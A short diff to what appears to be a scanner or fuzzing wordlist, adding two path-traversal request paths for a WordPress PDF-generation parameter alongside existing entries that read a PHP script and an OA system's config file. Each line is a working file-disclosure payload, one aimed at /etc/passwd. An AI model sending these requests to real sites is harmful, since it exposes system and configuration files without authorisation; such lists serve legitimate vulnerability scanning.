@@ -1,2 +1,4 @@
 /_admin/imgdownload.php?filename=imgdownload.php
 /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
+/elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=../../../../../../../../../../../../../../etc/passwd
+/elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=../../../../../../../../../../../../../../path/to/file
